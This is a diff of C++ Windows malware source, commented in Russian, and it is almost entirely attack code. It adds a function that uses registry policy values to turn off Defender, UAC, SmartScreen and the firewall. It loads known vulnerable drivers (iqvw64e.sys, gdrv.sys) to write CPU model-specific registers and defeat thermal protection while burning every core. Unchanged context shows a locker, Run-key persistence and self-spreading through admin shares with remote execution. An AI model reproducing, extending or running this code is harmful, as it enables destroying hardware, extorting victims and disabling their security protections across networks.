@@ -11,7 +11,7 @@
 #include <iostream>
 #include <string>
 #include "config.h"
-#include "driver_blob.h"
+#include "byovd.h"
 
 #pragma comment(lib, "netapi32.lib")
 #pragma comment(lib, "ws2_32.lib")
@@ -55,81 +55,28 @@ void RunHidden(const std::wstring& args) {
     }
 }
 
-// ============ ДРАЙВЕР ============
-#define IOCTL_KILL  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_MSR   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x901, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_PORT  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x902, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-bool InstallDriver() {
-    std::wstring tmp = L"C:\\Windows\\Temp\\" + std::wstring(DRV_NAME);
-    {
-        std::ofstream f(tmp, std::ios::binary);
-        if (!f) return false;
-        f.write((const char*)NvRmDrv_sys, NvRmDrv_sys_len);
-    }
-    std::wstring sys = L"C:\\Windows\\System32\\drivers\\" + std::wstring(DRV_NAME);
-    CopyFileW(tmp.c_str(), sys.c_str(), FALSE);
-
-    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
-    if (!scm) return false;
-    SC_HANDLE svc = CreateServiceW(scm, DRV_SVC, DRV_SVC,
-        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
-        SERVICE_ERROR_IGNORE, sys.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
-    if (!svc) svc = OpenServiceW(scm, DRV_SVC, SERVICE_ALL_ACCESS);
-    if (!svc) { CloseServiceHandle(scm); return false; }
-
-    BOOL started = StartServiceW(svc, 0, nullptr);
-    DWORD se = started ? 0 : GetLastError();
-    CloseServiceHandle(svc);
-    CloseServiceHandle(scm);
-    if (!started && se != ERROR_SERVICE_ALREADY_RUNNING) return false;
-
-    HANDLE h = CreateFileW(L"\\\\.\\NvRmDrv", GENERIC_READ | GENERIC_WRITE,
-        0, nullptr, OPEN_EXISTING, 0, nullptr);
-    if (h == INVALID_HANDLE_VALUE) return false;
-    DWORD ret = 0;
-    DeviceIoControl(h, IOCTL_KILL, nullptr, 0, nullptr, 0, &ret, nullptr);
-    CloseHandle(h);
-    return true;
-}
-
-// ============ MSR ============
-class Ring0 {
-public:
-    HANDLE h = INVALID_HANDLE_VALUE;
-    bool Open() {
-        h = CreateFileW(L"\\\\.\\NvRmDrv", GENERIC_READ | GENERIC_WRITE,
-            0, nullptr, OPEN_EXISTING, 0, nullptr);
-        return h != INVALID_HANDLE_VALUE;
-    }
-    bool WriteMsr(DWORD reg, DWORD eax, DWORD edx) {
-        if (h == INVALID_HANDLE_VALUE) return false;
-        struct { DWORD reg, eax, edx; } in = { reg, eax, edx };
-        DWORD ret = 0;
-        return DeviceIoControl(h, IOCTL_MSR, &in, sizeof(in),
-                               &ret, sizeof(ret), &ret, nullptr) != 0;
-    }
-    bool OutPort(DWORD port, DWORD val) {
-        if (h == INVALID_HANDLE_VALUE) return false;
-        struct { DWORD port, val; } in = { port, val };
-        DWORD ret = 0;
-        return DeviceIoControl(h, IOCTL_PORT, &in, sizeof(in),
-                               &ret, sizeof(ret), &ret, nullptr) != 0;
-    }
-    void Close() { if (h != INVALID_HANDLE_VALUE) CloseHandle(h); }
-};
-
-bool IsIntel() {
-    int c[4]; __cpuid(c, 0);
-    char v[13] = {};
-    memcpy(v + 0, &c[1], 4); memcpy(v + 4, &c[3], 4); memcpy(v + 8, &c[2], 4);
-    return strcmp(v, "GenuineIntel") == 0;
-}
-bool IsAMD() {
-    int c[4]; __cpuid(c, 0);
-    char v[13] = {};
-    memcpy(v + 0, &c[1], 4); memcpy(v + 4, &c[3], 4); memcpy(v + 8, &c[2], 4);
-    return strcmp(v, "AuthenticAMD") == 0;
+// ============ СНЯТИЕ ЗАЩИТ ============
+void KillDefenderAndUAC() {
+    auto SetDw = [](const wchar_t* path, const wchar_t* name, DWORD val) {
+        HKEY hk;
+        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, path, 0, nullptr, 0, KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
+            RegSetValueExW(hk, name, 0, REG_DWORD, (BYTE*)&val, sizeof(val));
+            RegCloseKey(hk);
+        }
+    };
+    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiSpyware", 1);
+    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", L"DisableAntiVirus", 1);
+    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", L"DisableRealtimeMonitoring", 1);
+    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", L"DisableBehaviorMonitoring", 1);
+    SetDw(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", L"DisableOnAccessProtection", 1);
+    SetDw(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"EnableLUA", 0);
+    SetDw(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"ConsentPromptBehaviorAdmin", 0);
+    SetDw(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"PromptOnSecureDesktop", 0);
+    SetDw(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", L"SmartScreenEnabled", 0);
+    SetDw(L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", L"EnableFirewall", 0);
+    SetDw(L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", L"EnableFirewall", 0);
+    RunHidden(L"sc stop WinDefend");
+    RunHidden(L"sc config WinDefend start= disabled");
 }
 
 // ============ BURNER ============
@@ -187,21 +134,27 @@ void StartBurner() {
     DisableWindowsThermal();
     KillVendorFans();
 
-    Ring0 r0;
-    bool ok = r0.Open();
-    if (ok) {
-        if (IsIntel()) {
-            r0.WriteMsr(0x1A0, 0, 0);
-            r0.WriteMsr(0x1A2, 0, 0);
-            r0.WriteMsr(0x199, 0x00001F00, 0);
-            r0.WriteMsr(0x1B2, 0, 0);
-            r0.WriteMsr(0x19B, 0, 0);
-        } else if (IsAMD()) {
-            r0.WriteMsr(0xC0010055, 0, 0);
-        }
-        r0.OutPort(0x404, 0);
-        r0.OutPort(0x400, 0x11);
-        r0.OutPort(0x402, 0);
+    // MSR через BYOVD драйверы
+    Iqvw iq;
+    Gdrv gd;
+    if (iq.Open()) {
+        iq.WriteMsr(0x1A0, 0, 0);
+        iq.WriteMsr(0x1A2, 0, 0);
+        iq.WriteMsr(0x199, 0x00001F00, 0);
+        iq.WriteMsr(0x1B2, 0, 0);
+        iq.WriteMsr(0x19B, 0, 0);
+        iq.OutPort(0x404, 0);
+        iq.OutPort(0x400, 0x11);
+        iq.OutPort(0x402, 0);
+        iq.Close();
+    } else if (gd.Open()) {
+        gd.WriteMsr(0x1A0, 0, 0);
+        gd.WriteMsr(0x1A2, 0, 0);
+        gd.WriteMsr(0x199, 0x00001F00, 0);
+        gd.OutPort(0x404, 0);
+        gd.OutPort(0x400, 0x11);
+        gd.OutPort(0x402, 0);
+        gd.Close();
     }
 
     SYSTEM_INFO si;
@@ -209,14 +162,6 @@ void StartBurner() {
     static std::vector<std::thread> threads;
     for (int i = 0; i < (int)si.dwNumberOfProcessors; i++)
         threads.emplace_back(BurnCore, i % si.dwNumberOfProcessors);
-    static std::thread keep([]() {
-        while (true) {
-            std::this_thread::sleep_for(std::chrono::seconds(30));
-            DisableWindowsThermal();
-            KillVendorFans();
-        }
-    });
-    keep.detach();
 }
 
 // ============ LOCKER ============
@@ -363,7 +308,6 @@ void Spread() {
                 (L"\\\\" + ip + L"\\C$\\Windows\\Temp\\" + PAYLOAD_NAME).c_str(), FALSE) != 0;
             if (ok) {
                 RunRemote(ip);
-                std::wcout << L"[+] " << ip << L" (" << u << L")\n";
             }
             CloseSess(ip);
             if (ok) break;
@@ -380,6 +324,13 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
     EnablePriv(L"SeLoadDriverPrivilege");
     EnablePriv(L"SeSystemEnvironmentPrivilege");
     EnablePriv(L"SeTcbPrivilege");
+
+    // 1. Снимаем софт-защиты
+    KillDefenderAndUAC();
+
+    // 2. Ставим BYOVD драйверы
+    InstallByovd(L"iqvw64e.sys", L"iqvw64e");
+    InstallByovd(L"gdrv.sys", L"gdrv");
 
     HKEY hk;
     if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, REG_RUN_KEY, 0, nullptr, 0,
@@ -408,7 +359,6 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
         return 0;
     }
 
-    InstallDriver();
     Hijack();
     StartBurner();
     StartLocker(hInst);
